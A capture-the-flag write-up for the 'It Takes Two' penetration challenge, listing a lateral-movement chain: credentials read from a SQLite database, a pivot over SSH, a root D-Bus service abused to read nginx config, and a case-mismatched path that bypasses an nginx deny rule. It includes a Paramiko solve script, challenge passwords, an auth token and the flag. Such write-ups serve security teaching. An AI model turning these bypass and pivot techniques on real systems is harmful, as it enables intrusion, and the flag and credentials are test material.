# It Takes Two — Writeup

## Category
Penetration

## Tools Used
- SSH / Paramiko
- SQLite
- Manual source review

## Vulnerabilities Exploited
- Readable internal credentials in the webapp database
- Root command execution exposed over D-Bus on the `security` host
- Nginx access-control mismatch with case-insensitive Express routing
- Trust based on source IP and injected proxy header

## Solve Process
1. SSH into `chal.polyuctf.com:13893` as `player`.
2. Enumerate the host and find a Node.js app in `/opt/webapp`.
3. Read `server.js` and see `/admin_portal` is only allowed when the request comes from host `security` and includes a valid `X-Auth-Token`.
4. Inspect `/opt/webapp/data/app.db` and decode `system_params.svc_health_03`.
5. Recover internal credentials for a second host:

```text
host: security
user: monitor
password: M0n1t0r_S3cur3_2026!
```

6. Pivot from `webapp` to `security` over SSH.
7. Enumerate `security` and find a root D-Bus service in `/opt/diagnostics/diagnostics-service.py` that executes arbitrary shell commands.
8. Use that root D-Bus method to read `/etc/nginx/conf.d/default.conf`.
9. Discover nginx blocks only the exact path `/admin_portal`, but proxies everything else to `vulnerable:8000` while injecting:

```text
X-Auth-Token: S3cur1ty_M0n1t0r_T0k3n_X9K2!
```

10. Notice Express matches routes case-insensitively, so requesting `/adMin_portal` bypasses nginx’s exact lowercase deny rule.
11. Request `http://security/adMin_portal` through the first foothold.
12. Nginx forwards the request to the backend, injects the token, and the backend accepts the source IP as the trusted `security` host.

## Solve Script

```python
import paramiko


JUMP_HOST = "chal.polyuctf.com"
JUMP_PORT = 13893
JUMP_USER = "player"
JUMP_PASS = "Pl4y3r_SSH_2026!"


def main():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        JUMP_HOST,
        port=JUMP_PORT,
        username=JUMP_USER,
        password=JUMP_PASS,
        allow_agent=False,
        look_for_keys=False,
        timeout=10,
        banner_timeout=10,
        auth_timeout=10,
    )

    channel = client.get_transport().open_channel(
        "direct-tcpip", ("security", 80), ("127.0.0.1", 0)
    )

    request = (
        "GET /adMin_portal HTTP/1.1\r\n"
        "Host: security\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    channel.sendall(request)

    data = b""
    while True:
        chunk = channel.recv(65535)
        if not chunk:
            break
        data += chunk

    channel.close()
    client.close()

    print(data.decode("utf-8", "ignore"))


if __name__ == "__main__":
    main()
```

## Flag

```text
PUCTF26{1t_t4k3s_tw0_t0_t4ng0_QPii1ybVq8HcGjbE25BJUlhvsGJOieTQ}
```
